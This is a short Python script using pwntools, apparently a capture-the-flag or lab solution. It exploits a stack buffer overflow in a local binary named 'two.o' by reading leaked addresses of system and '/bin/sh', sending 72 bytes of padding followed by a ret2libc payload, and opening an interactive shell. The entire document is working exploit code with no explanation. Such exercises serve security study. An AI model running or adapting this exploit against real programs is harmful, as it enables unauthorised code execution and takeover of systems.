from pwn import process
import struct
import sys

target = process("./two.o")
target.recvline()

message = target.recvline().decode("utf-8").split()
system = int(message[2].strip(','), 16)
binsh = int(message[5], 16)
ret = 0xffffffff # arbitrary return address

padding = b'\x41' * 72
payload = padding + struct.pack("<L", system) + struct.pack("<L", ret) + struct.pack("<L", binsh)

target.sendline(payload)
target.interactive()
